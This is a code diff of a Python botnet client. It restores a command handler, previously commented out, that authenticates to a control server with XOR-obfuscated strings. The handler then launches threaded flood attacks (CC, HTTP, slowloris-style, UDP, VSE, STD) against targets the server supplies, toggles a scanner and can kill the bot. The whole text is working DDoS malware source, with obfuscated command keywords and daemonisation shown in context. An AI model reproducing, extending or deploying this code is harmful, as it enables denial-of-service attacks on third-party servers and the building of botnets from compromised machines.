@@ -243,91 +243,91 @@ def scanner():
 				pass
 		time.sleep(0.03)
 
-#def handle(sock):
-	#global stop
-	#attack = 0
-	#sock.send(xor_enc("1337",key).encode())#login code
-	#while True:
-		#tmp = sock.recv(1024).decode()
-		#if len(tmp) == 0:
-			#break#return main loop
-		#print(tmp)
-		#data = xor_dec(tmp,key)
-		#if data[0] == '!':
-			#try:
-				#command = data.split()
-				#print(command)
-				#if command[0] == xor_dec('QBAH',key):#encoded keywords: !cc
-					#if attack != 0:
-						#stop = True
-						#attack=0
-					#stop = False
-					#for _ in range(int(command[3])):
-						#p = threading.Thread(target=CC, args=(command[1],command[2]))
-						#p.start()
-					#attack+=1
-				#elif command[0] == xor_dec('QBsQEhc=',key):#encoded keywords: !http
-					#if attack != 0:
-						#stop = True
-						#attack=0
-					#stop = False
-					#for _ in range(int(command[3])):
-						#p = threading.Thread(target=HTTP, args =(command[1],command[2],command[4]))
-						#p.start()
-					#attack+=1
-				#elif command[0] == xor_dec('QAAICRA=',key):#encoded keywords: !slow
-					#if attack != 0:
-						#stop = True
-						#attack=0
-					#stop = False
-					#for _ in range(int(command[3])):
-						#p = threading.Thread(target=SLOW, args =(command[1],command[2],command[4],command[5]))
-						#p.start()
-					#attack+=1
-				#elif command[0] == xor_dec('QAYAFg==',key):#encoded keywords: !udp
-					#if attack != 0:
-						#stop = True
-						#attack=0
-					#stop = False
-					#for _ in range(int(command[3])):
-						#p = threading.Thread(target=UDP, args =(command[1],command[2],command[4]))
-						#p.start()
-					#attack+=1
-				#elif command[0] == xor_dec('QAUXAw==',key):#encoded keyword: !vse
-					#if attack != 0:
-						#stop = True
-						#attack=0
-					#stop = False
-					#for _ in range(int(command[3])):
-						#p = threading.Thread(target=VSE, args =(command[1],command[2]))
-						#p.start()
-					#attack+=1
-				#elif command[0] == xor_dec('QAAQAg==',key):#encoded keyword: !std
-					#if attack != 0:
-						#stop = True
-						#attack=0
-					#stop = False
-					#for _ in range(int(command[3])):
-						#p = threading.Thread(target=STD, args =(command[1],command[2]))
-						#p.start()
-					#attack+=1
-				#elif command[0] == xor_dec('QAAHBwk=',key):
-					#global scan
-					#if command[1] == "1":
-						#scan = True
-					#if command[1] == "0":
-						#scan = False
-				#elif command[0] == xor_dec('QAAQCRc=',key):#!stop
-					#stop = True
-					#attack = 0#clear attack list
-				#elif command[0] == xor_dec('QBgNCgs=',key):#!kill : kill bot
-					#sock.close()
-					#return 1
-			#except:#if have error than will pass
-				#pass
-		#if data == xor_dec("ERoKAQ==",key):#ping
-			#sock.send(xor_enc("pong",key).encode())#keepalive and check connection alive
-	#return 0
+def handle(sock):
+	global stop
+	attack = 0
+	sock.send(xor_enc("1337",key).encode())#login code
+	while True:
+		tmp = sock.recv(1024).decode()
+		if len(tmp) == 0:
+			break#return main loop
+		print(tmp)
+		data = xor_dec(tmp,key)
+		if data[0] == '!':
+			try:
+				command = data.split()
+				print(command)
+				if command[0] == xor_dec('QBAH',key):#encoded keywords: !cc
+					if attack != 0:
+						stop = True
+						attack=0
+					stop = False
+					for _ in range(int(command[3])):
+						p = threading.Thread(target=CC, args=(command[1],command[2]))
+						p.start()
+					attack+=1
+				elif command[0] == xor_dec('QBsQEhc=',key):#encoded keywords: !http
+					if attack != 0:
+						stop = True
+						attack=0
+					stop = False
+					for _ in range(int(command[3])):
+						p = threading.Thread(target=HTTP, args =(command[1],command[2],command[4]))
+						p.start()
+					attack+=1
+				elif command[0] == xor_dec('QAAICRA=',key):#encoded keywords: !slow
+					if attack != 0:
+						stop = True
+						attack=0
+					stop = False
+					for _ in range(int(command[3])):
+						p = threading.Thread(target=SLOW, args =(command[1],command[2],command[4],command[5]))
+						p.start()
+					attack+=1
+				elif command[0] == xor_dec('QAYAFg==',key):#encoded keywords: !udp
+					if attack != 0:
+						stop = True
+						attack=0
+					stop = False
+					for _ in range(int(command[3])):
+						p = threading.Thread(target=UDP, args =(command[1],command[2],command[4]))
+						p.start()
+					attack+=1
+				elif command[0] == xor_dec('QAUXAw==',key):#encoded keyword: !vse
+					if attack != 0:
+						stop = True
+						attack=0
+					stop = False
+					for _ in range(int(command[3])):
+						p = threading.Thread(target=VSE, args =(command[1],command[2]))
+						p.start()
+					attack+=1
+				elif command[0] == xor_dec('QAAQAg==',key):#encoded keyword: !std
+					if attack != 0:
+						stop = True
+						attack=0
+					stop = False
+					for _ in range(int(command[3])):
+						p = threading.Thread(target=STD, args =(command[1],command[2]))
+						p.start()
+					attack+=1
+				elif command[0] == xor_dec('QAAHBwk=',key):
+					global scan
+					if command[1] == "1":
+						scan = True
+					if command[1] == "0":
+						scan = False
+				elif command[0] == xor_dec('QAAQCRc=',key):#!stop
+					stop = True
+					attack = 0#clear attack list
+				elif command[0] == xor_dec('QBgNCgs=',key):#!kill : kill bot
+					sock.close()
+					return 1
+			except:#if have error than will pass
+				pass
+		if data == xor_dec("ERoKAQ==",key):#ping
+			sock.send(xor_enc("pong",key).encode())#keepalive and check connection alive
+	return 0
 
 def daemon():#daemon
 	pid = os.fork()#first fork
